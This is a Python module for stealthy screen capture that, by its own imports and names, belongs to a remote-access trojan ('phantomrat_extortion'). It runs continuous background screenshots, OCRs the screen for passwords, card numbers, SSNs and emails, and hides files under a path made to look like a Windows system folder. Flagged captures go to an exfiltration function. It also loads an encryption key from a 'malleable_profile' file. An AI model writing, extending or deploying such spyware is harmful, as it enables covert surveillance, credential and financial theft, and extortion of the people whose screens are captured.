import mss
import mss.tools
import numpy as np
import cv2
import base64
import io
import time
import json
import os
import threading
import queue
import pytesseract
from PIL import Image
from datetime import datetime
from cryptography.fernet import Fernet
import logging
from collections import deque

logger = logging.getLogger(__name__)

class EnhancedScreenshot:
    """
    Enhanced screenshot capture with OCR, activity detection, and intelligent monitoring
    """
    
    def __init__(self, encryption_key=None):
        self.encryption_key = encryption_key
        self.screen_capture = mss.mss()
        self.is_monitoring = False
        self.monitor_thread = None
        self.activity_queue = queue.Queue()
        
        # Screen regions to monitor
        self.monitor_regions = []  # List of (x, y, width, height)
        self.important_regions = []  # Regions with sensitive content
        
        # OCR settings
        self.ocr_enabled = True
        self.ocr_language = 'eng'
        self.sensitive_keywords = [
            'password', 'login', 'username', 'email', 'credit',
            'card', 'bank', 'account', 'secret', 'token', 'key',
            'passphrase', 'pin', 'ssn', 'social security'
        ]
        
        # Activity detection
        self.activity_threshold = 0.1  # 10% change
        self.last_screenshots = deque(maxlen=5)
        
        # Storage
        self.storage_path = self._get_storage_path()
        os.makedirs(self.storage_path, exist_ok=True)
        
        # Encryption
        self.fernet = None
        if encryption_key:
            try:
                if isinstance(encryption_key, bytes):
                    self.fernet = Fernet(encryption_key)
                else:
                    import base64 as b64
                    key = encryption_key.encode().ljust(32)[:32]
                    self.fernet = Fernet(b64.urlsafe_b64encode(key))
            except:
                logger.warning("Failed to initialize encryption")
        
        # Performance optimization
        self.capture_quality = 85  # JPEG quality (1-100)
        self.capture_scale = 0.5  # Scale factor for faster processing
        
        # Window title capture (requires additional setup)
        self.capture_window_titles = True
        
        # Initialize monitor regions
        self._init_monitor_regions()
    
    def _get_storage_path(self):
        """Get storage path for screenshots"""
        if os.name == 'nt':  # Windows
            path = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Screenshots')
        else:  # Linux/macOS
            path = os.path.join(os.path.expanduser('~'), '.local', 'share', 'screenshots')
        
        os.makedirs(path, exist_ok=True)
        return path
    
    def _init_monitor_regions(self):
        """Initialize default monitor regions"""
        # Get screen dimensions
        try:
            monitor = self.screen_capture.monitors[1]  # Primary monitor
            width = monitor['width']
            height = monitor['height']
            
            # Define important regions (example: login areas, chat windows)
            self.important_regions = [
                {'name': 'top_left', 'bbox': (0, 0, width//2, height//3)},
                {'name': 'center', 'bbox': (width//4, height//4, width//2, height//2)},
                {'name': 'bottom_right', 'bbox': (width//2, 2*height//3, width//2, height//3)}
            ]
        except:
            pass
    
    def capture_screen(self, region=None, ocr_analysis=True, save_local=True):
        """
        Capture screenshot with optional OCR analysis
        """
        try:
            # Capture screenshot
            if region:
                screenshot = self.screen_capture.grab(region)
            else:
                screenshot = self.screen_capture.grab(self.screen_capture.monitors[1])
            
            # Convert to PIL Image
            img = Image.frombytes('RGB', screenshot.size, screenshot.rgb)
            
            # Scale down for processing if needed
            if self.capture_scale < 1.0:
                new_size = (int(img.width * self.capture_scale), 
                          int(img.height * self.capture_scale))
                img = img.resize(new_size, Image.Resampling.LANCZOS)
            
            # Prepare result
            result = {
                'timestamp': datetime.now().isoformat(),
                'resolution': img.size,
                'region': region if region else 'full_screen',
                'has_sensitive_content': False,
                'ocr_text': '',
                'detected_keywords': [],
                'window_title': self._get_active_window_title() if self.capture_window_titles else None
            }
            
            # OCR analysis
            if ocr_analysis and self.ocr_enabled:
                ocr_result = self._perform_ocr(img)
                result['ocr_text'] = ocr_result['text']
                result['detected_keywords'] = ocr_result['detected_keywords']
                result['has_sensitive_content'] = ocr_result['has_sensitive']
                
                if ocr_result['has_sensitive']:
                    logger.info(f"Sensitive content detected: {ocr_result['detected_keywords']}")
            
            # Activity detection
            activity_score = self._detect_activity(img)
            result['activity_score'] = activity_score
            result['has_activity'] = activity_score > self.activity_threshold
            
            # Store for comparison
            self.last_screenshots.append(img)
            
            # Save locally if requested
            if save_local:
                screenshot_data = self._save_screenshot(img, result)
                result['local_path'] = screenshot_data['path']
                result['file_size'] = screenshot_data['size']
            
            # Convert to base64 for transmission
            img_bytes = io.BytesIO()
            img.save(img_bytes, format='JPEG', quality=self.capture_quality)
            
            if self.fernet:
                encrypted = self.fernet.encrypt(img_bytes.getvalue())
                result['image_data'] = base64.b64encode(encrypted).decode()
                result['encrypted'] = True
            else:
                result['image_data'] = base64.b64encode(img_bytes.getvalue()).decode()
                result['encrypted'] = False
            
            return result
            
        except Exception as e:
            logger.error(f"Screenshot capture error: {e}")
            return None
    
    def _perform_ocr(self, image):
        """Perform OCR on image and check for sensitive content"""
        result = {
            'text': '',
            'detected_keywords': [],
            'has_sensitive': False
        }
        
        try:
            # Convert to grayscale for better OCR
            gray_image = image.convert('L')
            
            # Perform OCR
            text = pytesseract.image_to_string(gray_image, lang=self.ocr_language)
            result['text'] = text.lower()
            
            # Check for sensitive keywords
            for keyword in self.sensitive_keywords:
                if keyword in text.lower():
                    result['detected_keywords'].append(keyword)
                    result['has_sensitive'] = True
            
            # Also check for patterns (emails, credit cards, etc.)
            self._check_patterns(text, result)
            
        except Exception as e:
            logger.error(f"OCR error: {e}")
            # Try with simpler OCR if pytesseract fails
            result['text'] = "OCR failed"
        
        return result
    
    def _check_patterns(self, text, result):
        """Check for specific patterns in text"""
        import re
        
        patterns = {
            'email': r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
            'credit_card': r'\b(?:\d[ -]*?){13,16}\b',
            'phone': r'\b(\+\d{1,2}\s?)?\(?\d{3}\)?[\s.-]?\d{3}[\s.-]?\d{4}\b',
            'ssn': r'\b\d{3}[-]?\d{2}[-]?\d{4}\b',
            'ip_address': r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
        }
        
        for pattern_name, pattern in patterns.items():
            matches = re.findall(pattern, text)
            if matches:
                result['detected_keywords'].extend([f"{pattern_name}: {match}" for match in matches[:3]])
                result['has_sensitive'] = True
    
    def _detect_activity(self, current_image):
        """Detect activity by comparing with previous screenshots"""
        if not self.last_screenshots:
            return 0.0
        
        try:
            # Convert to numpy arrays for comparison
            current_array = np.array(current_image.convert('L'))
            
            # Compare with last screenshot
            last_image = self.last_screenshots[-1]
            last_array = np.array(last_image.convert('L'))
            
            # Ensure same dimensions
            if current_array.shape != last_array.shape:
                current_array = cv2.resize(current_array, (last_array.shape[1], last_array.shape[0]))
            
            # Calculate difference
            diff = cv2.absdiff(current_array, last_array)
            _, thresh = cv2.threshold(diff, 25, 255, cv2.THRESH_BINARY)
            
            # Calculate percentage of changed pixels
            changed_pixels = np.count_nonzero(thresh)
            total_pixels = thresh.size
            
            activity_score = changed_pixels / total_pixels
            
            return activity_score
            
        except Exception as e:
            logger.error(f"Activity detection error: {e}")
            return 0.0
    
    def _get_active_window_title(self):
        """Get active window title"""
        try:
            if os.name == 'nt':  # Windows
                import win32gui
                window = win32gui.GetForegroundWindow()
                return win32gui.GetWindowText(window)
            else:  # Linux
                import subprocess
                result = subprocess.run(['xdotool', 'getwindowfocus', 'getwindowname'], 
                                      capture_output=True, text=True)
                return result.stdout.strip()
        except:
            return "Unknown"
    
    def _save_screenshot(self, image, metadata):
        """Save screenshot locally with metadata"""
        try:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"screenshot_{timestamp}.jpg"
            filepath = os.path.join(self.storage_path, filename)
            
            # Save image
            image.save(filepath, format='JPEG', quality=self.capture_quality)
            
            # Save metadata
            meta_filename = f"screenshot_{timestamp}_meta.json"
            meta_filepath = os.path.join(self.storage_path, meta_filename)
            
            with open(meta_filepath, 'w') as f:
                json.dump(metadata, f, indent=2)
            
            return {
                'path': filepath,
                'size': os.path.getsize(filepath),
                'meta_path': meta_filepath
            }
            
        except Exception as e:
            logger.error(f"Error saving screenshot: {e}")
            return {'path': None, 'size': 0}
    
    def capture_multiple_regions(self, regions=None):
        """Capture multiple regions of the screen"""
        if regions is None:
            regions = self.important_regions
        
        results = []
        
        for region_info in regions:
            region_name = region_info.get('name', 'unknown')
            region_bbox = region_info.get('bbox')
            
            if region_bbox:
                # Convert to mss format (left, top, width, height)
                mss_region = {
                    'left': region_bbox[0],
                    'top': region_bbox[1],
                    'width': region_bbox[2],
                    'height': region_bbox[3]
                }
                
                result = self.capture_screen(region=mss_region, ocr_analysis=True)
                if result:
                    result['region_name'] = region_name
                    results.append(result)
        
        return results
    
    def start_continuous_monitoring(self, interval=30, callback=None):
        """
        Start continuous screen monitoring
        """
        def monitor_loop():
            self.is_monitoring = True
            
            while self.is_monitoring:
                try:
                    # Capture full screen
                    result = self.capture_screen(ocr_analysis=True, save_local=True)
                    
                    if result:
                        # Check for important activity
                        if (result.get('has_sensitive_content') or 
                            result.get('has_activity') or
                            result.get('activity_score', 0) > self.activity_threshold * 2):
                            
                            # This is important activity, capture more details
                            self._handle_important_activity(result)
                        
                        # Send to callback if provided
                        if callback:
                            callback(result)
                        
                        # Add to activity queue
                        self.activity_queue.put(result)
                    
                    # Sleep until next capture
                    time.sleep(interval)
                    
                except Exception as e:
                    logger.error(f"Monitor loop error: {e}")
                    time.sleep(min(interval, 10))
        
        self.monitor_thread = threading.Thread(target=monitor_loop, daemon=True)
        self.monitor_thread.start()
        
        logger.info(f"Started continuous screen monitoring (interval: {interval}s)")
    
    def _handle_important_activity(self, screenshot_data):
        """Handle important screen activity"""
        try:
            # Capture additional details
            regions_result = self.capture_multiple_regions()
            
            # Prepare alert
            alert_data = {
                'type': 'screen_alert',
                'timestamp': datetime.now().isoformat(),
                'reason': [],
                'screenshot': screenshot_data.get('image_data'),
                'regions': regions_result,
                'window_title': screenshot_data.get('window_title'),
                'activity_score': screenshot_data.get('activity_score', 0)
            }
            
            # Determine reason
            if screenshot_data.get('has_sensitive_content'):
                alert_data['reason'].append('sensitive_content')
                alert_data['keywords'] = screenshot_data.get('detected_keywords', [])
            
            if screenshot_data.get('has_activity'):
                alert_data['reason'].append('high_activity')
            
            # Send alert via exfiltration
            from phantomrat_extortion import exfil_data
            exfil_data(alert_data)
            
            # Save detailed capture
            self._save_detailed_alert(alert_data)
            
            logger.info(f"Screen alert: {', '.join(alert_data['reason'])}")
            
        except Exception as e:
            logger.error(f"Error handling important activity: {e}")
    
    def _save_detailed_alert(self, alert_data):
        """Save detailed alert information"""
        try:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"screen_alert_{timestamp}.json"
            filepath = os.path.join(self.storage_path, filename)
            
            with open(filepath, 'w') as f:
                json.dump(alert_data, f, indent=2)
            
            logger.info(f"Saved screen alert to {filepath}")
            
        except Exception as e:
            logger.error(f"Error saving alert: {e}")
    
    def stop_continuous_monitoring(self):
        """Stop continuous monitoring"""
        self.is_monitoring = False
        if self.monitor_thread:
            self.monitor_thread.join(timeout=5)
        logger.info("Stopped continuous screen monitoring")
    
    def get_recent_activity(self, limit=10):
        """Get recent screen activity"""
        activities = []
        
        while not self.activity_queue.empty() and len(activities) < limit:
            try:
                activities.append(self.activity_queue.get_nowait())
            except:
                break
        
        return activities
    
    def cleanup_old_screenshots(self, max_age_days=7, max_total_mb=500):
        """Cleanup old screenshot files"""
        try:
            # Find all screenshot files
            image_files = []
            meta_files = []
            
            for f in os.listdir(self.storage_path):
                if f.startswith('screenshot_') and f.endswith('.jpg'):
                    image_files.append(f)
                elif f.startswith('screenshot_') and f.endswith('_meta.json'):
                    meta_files.append(f)
                elif f.startswith('screen_alert_') and f.endswith('.json'):
                    meta_files.append(f)
            
            # Sort by timestamp in filename
            image_files.sort()
            meta_files.sort()
            
            # Calculate total size
            total_size = 0
            files_info = []
            
            for f in image_files + meta_files:
                filepath = os.path.join(self.storage_path, f)
                if os.path.exists(filepath):
                    size = os.path.getsize(filepath)
                    mtime = os.path.getmtime(filepath)
                    total_size += size
                    files_info.append((filepath, mtime, size))
            
            # Sort by modification time (oldest first)
            files_info.sort(key=lambda x: x[1])
            
            cutoff_time = time.time() - (max_age_days * 24 * 3600)
            max_total_bytes = max_total_mb * 1024 * 1024
            
            deleted = 0
            deleted_size = 0
            
            for filepath, mtime, size in files_info:
                # Delete if too old or if total size exceeds limit
                if mtime < cutoff_time or (total_size - deleted_size) > max_total_bytes:
                    try:
                        os.remove(filepath)
                        deleted += 1
                        deleted_size += size
                        
                        # Also delete corresponding files
                        base_name = os.path.splitext(os.path.basename(filepath))[0]
                        if filepath.endswith('.jpg'):
                            # Delete metadata file
                            meta_file = os.path.join(self.storage_path, f"{base_name}_meta.json")
                            if os.path.exists(meta_file):
                                os.remove(meta_file)
                                deleted += 1
                                deleted_size += os.path.getsize(meta_file)
                        elif filepath.endswith('_meta.json'):
                            # Delete image file
                            img_file = os.path.join(self.storage_path, f"{base_name.replace('_meta', '')}.jpg")
                            if os.path.exists(img_file):
                                os.remove(img_file)
                                deleted += 1
                                deleted_size += os.path.getsize(img_file)
                    except:
                        pass
            
            if deleted > 0:
                logger.info(f"Cleaned up {deleted} old screenshot files ({deleted_size/(1024*1024):.1f} MB)")
            
            return deleted
            
        except Exception as e:
            logger.error(f"Error cleaning up screenshots: {e}")
            return 0

def capture_screen(region=None, ocr_analysis=True):
    """
    Main function to capture screenshot
    """
    try:
        # Load encryption key from profile
        encryption_key = None
        try:
            with open('malleable_profile.json', 'r') as f:
                profile = json.load(f)
                key_str = profile['encryption']['key']
                if len(key_str) < 32:
                    key_str = key_str.ljust(32)[:32]
                encryption_key = key_str.encode()
        except:
            pass
        
        screenshot = EnhancedScreenshot(encryption_key=encryption_key)
        result = screenshot.capture_screen(region=region, ocr_analysis=ocr_analysis)
        
        if result:
            logger.info(f"Screenshot capture successful")
            if result.get('has_sensitive_content'):
                logger.warning(f"Sensitive content detected: {result.get('detected_keywords')}")
            return result
        else:
            logger.error("Screenshot capture failed")
            return None
            
    except Exception as e:
        logger.error(f"Screenshot capture error: {e}")
        return None

if __name__ == "__main__":
    # Test screenshot capture
    print("Testing Enhanced Screenshot Capture...")
    
    # Set up logging
    logging.basicConfig(level=logging.INFO)
    
    # Test capture
    result = capture_screen(ocr_analysis=True)
    
    if result:
        print(f"\nCapture successful!")
        print(f"Resolution: {result.get('resolution')}")
        print(f"Window: {result.get('window_title', 'Unknown')}")
        print(f"Has sensitive content: {result.get('has_sensitive_content', False)}")
        print(f"Activity score: {result.get('activity_score', 0):.3f}")
        
        if result.get('detected_keywords'):
            print(f"Detected keywords: {', '.join(result['detected_keywords'][:3])}")
        
        if result.get('local_path'):
            print(f"Saved to: {result['local_path']}")
    else:
        print("Screenshot capture failed")
